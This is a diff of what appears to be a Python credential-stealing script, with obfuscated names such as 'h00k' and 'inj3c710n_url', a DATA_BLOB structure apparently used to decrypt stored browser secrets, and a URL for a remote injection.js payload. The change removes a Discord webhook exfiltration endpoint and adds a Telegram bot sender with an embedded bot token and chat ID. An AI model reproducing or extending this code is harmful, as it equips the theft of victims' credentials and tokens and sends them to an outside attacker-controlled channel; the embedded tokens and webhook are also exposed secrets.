@@ -10,6 +10,7 @@ import urllib
 import random
 import warnings
 import threading
+import json
 import subprocess
 from sys import executable, stderr
 from base64 import b64decode
@@ -114,7 +115,24 @@ words = "https://rentry.co/5uu99/raw"
 wordsresp = requests.get(words)
 words = wordsresp.text
 
-h00k = "https://discord.com/api/webhooks/1249668833761951797/9_me_FHtpv6VCReT-mSDGM0Wg1z_PAlXjHwiMln3lnnwosSweuRONyXIGObwG2PoO2-g"
+def send_telegram_message(bot_token, chat_id, message):
+    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+    payload = {
+        "chat_id": chat_id,
+        "text": message
+    }
+    headers = {'Content-Type': 'application/json'}
+    response = requests.post(url, data=json.dumps(payload), headers=headers)
+    if response.status_code != 200:
+        print("Failed to send message to Telegram.")
+    else:
+        print("Message sent successfully to Telegram.")
+
+# Example usage:
+bot_token = "6632967746:AAFpn_3J7uPtY5qGJbtXgXZ14dQlrf_UG4o"
+chat_id = "1678197289"
+message = "Hello from your Python script!"
+send_telegram_message(bot_token, chat_id, message)
 inj3c710n_url = f"https://raw.githubusercontent.com/wtf{cname}wtf/index/main/injection.js"
 
 class DATA_BLOB(Structure):
